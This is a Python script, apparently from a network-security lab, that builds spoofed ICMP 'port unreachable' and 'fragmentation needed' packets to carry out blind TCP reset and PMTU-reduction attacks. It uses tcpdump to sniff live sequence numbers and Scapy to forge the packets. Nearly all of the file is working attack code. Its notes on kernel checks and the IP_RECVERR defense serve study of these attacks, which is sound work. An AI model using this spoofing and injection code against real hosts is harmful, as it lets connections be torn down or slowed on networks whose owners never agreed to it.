#!/usr/bin/env python3
"""
Packet crafting for the ICMP blind reset / PMTU-reduction attacks.

Direction correction vs. a literal reading of the design doc's packet
tables: ICMP error semantics are strict about direction. A real ICMP
error is always delivered to the ORIGINAL SENDER of the embedded packet
(outer destination == embedded source), because the receiving host can
only match it against a socket where the embedded header looks like
something *it* sent. So to make host T's kernel act on a spoofed error:
  - the embedded packet must look like something T itself sent
    (embedded src = T, embedded dst = T's peer P)
  - outer destination = T (so T actually receives and processes it)
  - outer source = P, spoofed (playing "whoever is reporting the
    problem" — plausibly P itself, or a router near P)
  - the embedded seq must fall inside T's *own* current send window,
    i.e. it must be sniffed from T's own outgoing segments, not P's.

This was verified empirically (see VM_COMMANDS.md's P4 section): crafting
the embedded header as literally written in the design doc's Section 3.2
table (embedded src=client) never matches any socket on the server, since
the server has no socket bound to the client's address. Swapping it to
embedded src=server/dst=client is what actually reaches the server's TCP
state machine.

For the reset attack we want to kill the SERVER's socket -> target=server.
For the PMTU attack we want to shrink the MSS of the bulk *sender* -> in
this lab that's the client driving iperf3 in P1/P5 -> target=client.

Also confirmed empirically on Ubuntu 22.04 / kernel 5.15: Type 3/Code 3
only immediately kills an ESTABLISHED socket if the application opted
into the IP_RECVERR socket option — see tcp_v4_err() in
net/ipv4/tcp_ipv4.c, which downgrades RFC 1122 hard errors to a
non-fatal sk_err_soft for established sockets unless IP_RECVERR is set.
Plain `ncat` does not set it, so a perfectly-crafted packet against an
ordinary `ncat`-held connection will NOT kill it — this is a real,
separate defense worth reporting alongside the doc's own Section 6 ideas.
Type 3/Code 4 (PMTU) has no IP_RECVERR-style gate: ipv4_sk_update_pmtu()
runs unconditionally once the embedded header matches a socket. But the
`between(seq, tp->snd_una, tp->snd_nxt)` in-window check in tcp_v4_err()
runs for *every* type/code, including this one — and for an ACTIVE bulk
transfer that window is only cwnd*mss wide (tens to a couple hundred KB)
and slides forward at the full transfer rate, so a single sniffed seq is
almost always already stale (ACKed and out of window) by the time it
goes through tcpdump + Python + Scapy send(). See inject_pmtu.py's
docstring for the spray-based fix this lab uses instead of one guess.
"""
import argparse
import re
import subprocess

from scapy.all import ICMP, IP, TCP, raw

CLIENT_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"


def capture_live_state(iface, from_ip, from_port, to_ip, count, timeout):
    """
    Sniff `from_ip`'s own outgoing TCP segments to `to_ip` and recover
    (from_port_seen, to_port_seen, next_seq): the two ports of the
    connection as seen on the wire, and the next sequence number
    `from_ip` itself is expected to send — i.e. a value inside
    `from_ip`'s *own* current send window. Pass from_port=None to match
    any source port (from_port_seen is then discovered from traffic
    rather than an input).
    """
    port_filter = f"src port {from_port} and " if from_port else ""
    cmd = [
        "tcpdump", "-i", iface, "-n", "-l", "-c", str(count),
        f"tcp and src host {from_ip} and {port_filter}dst host {to_ip}",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        stdout = result.stdout
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout or ""

    # Matches lines like:
    #   ... IP 10.0.0.2.9999 > 10.0.0.1.45526: Flags [S.], seq 1829896795, ...
    #   ... IP 10.0.0.1.51576 > 10.0.0.2.9999: Flags [P.], seq 1:7, ack 1, ...
    # tcpdump only prints "seq" for SYN/FIN/data-bearing segments, which is
    # exactly what we want: a sequence number known to be in-window right now.
    line_re = re.compile(
        rf"IP {re.escape(from_ip)}\.(\d+) > {re.escape(to_ip)}\.(\d+): "
        rf"Flags \[[^\]]*\], seq (\d+)(?::(\d+))?"
    )

    from_port_seen = to_port_seen = next_seq = None
    for line in stdout.splitlines():
        m = line_re.search(line)
        if not m:
            continue
        from_port_seen = int(m.group(1))
        to_port_seen = int(m.group(2))
        seq_start, seq_end = int(m.group(3)), m.group(4)
        if seq_end is not None:
            # "seq X:Y" is a data range; Y is the next byte from_ip expects to send/have acked.
            next_seq = int(seq_end)
        else:
            # A bare "seq N" (no colon) only appears for SYN/FIN, which each
            # consume one sequence number — pure zero-payload ACKs print no
            # seq at all. The next byte is therefore N + 1, not N.
            next_seq = seq_start + 1

    if from_port_seen is None:
        raise RuntimeError(
            f"No outgoing segment captured from {from_ip} to {to_ip}. "
            "Is there a live connection between them right now?"
        )
    return from_port_seen, to_port_seen, next_seq


def _build_icmp_error(target_ip, peer_ip, target_port, peer_port, seq, code, mtu=None):
    """
    Build a spoofed ICMP Destination Unreachable delivered to `target_ip`,
    embedding a packet that looks like one `target_ip` itself sent to
    `peer_ip` — see module docstring for why the direction matters.
    """
    inner_tcp = TCP(sport=target_port, dport=peer_port, seq=seq)
    # RFC 1191: a real "fragmentation needed" reply is only plausible for a
    # packet that had DF set, since that's the only case a router couldn't
    # just fragment it instead. Match that on the embedded copy for fidelity.
    inner_ip = IP(src=target_ip, dst=peer_ip, proto=6, flags="DF" if code == 4 else 0)
    icmp = ICMP(type=3, code=code)
    if mtu is not None:
        icmp.nexthopmtu = mtu
    outer_ip = IP(src=peer_ip, dst=target_ip)
    return outer_ip / icmp / inner_ip / inner_tcp


def build_reset_packet(client_port, server_port, seq_num):
    """
    ICMP Type 3, Code 3 — Port Unreachable, targeting the SERVER
    (RFC 792 hard error, RFC 1122). `seq_num` must be inside the
    server's own current send window — capture it with
    capture_live_state(iface, SERVER_IP, server_port, CLIENT_IP, ...).
    """
    return _build_icmp_error(SERVER_IP, CLIENT_IP, server_port, client_port, seq_num, code=3)


def build_pmtu_packet(client_port, server_port, seq_num, advertised_mtu=576):
    """
    ICMP Type 3, Code 4 — Fragmentation Needed, DF Set (RFC 1191),
    targeting the CLIENT (the bulk sender whose MSS we want to shrink).
    `seq_num` must be inside the client's own current send window —
    capture it with capture_live_state(iface, CLIENT_IP, None, SERVER_IP, ...).
    """
    return _build_icmp_error(CLIENT_IP, SERVER_IP, client_port, server_port, seq_num,
                              code=4, mtu=advertised_mtu)


def main():
    parser = argparse.ArgumentParser(
        description="Demo: sniff the live server->client state and build the reset packet.",
    )
    parser.add_argument("--iface", default="veth-at")
    parser.add_argument("--server-port", type=int, default=9999)
    parser.add_argument("--count", type=int, default=5)
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    print(f"Sniffing {args.iface} for {SERVER_IP}:{args.server_port} -> {CLIENT_IP} traffic...")
    _, client_port, seq = capture_live_state(
        args.iface, SERVER_IP, args.server_port, CLIENT_IP, args.count, args.timeout
    )
    print(f"Captured: client_port={client_port} server_seq={seq}")

    reset_pkt = build_reset_packet(client_port, args.server_port, seq)
    print("\n" + "=" * 60)
    print("RESET PACKET — Type 3, Code 3 (targets SERVER)")
    print("=" * 60)
    reset_pkt.show2()
    print("Raw bytes:", raw(reset_pkt).hex())


if __name__ == "__main__":
    main()
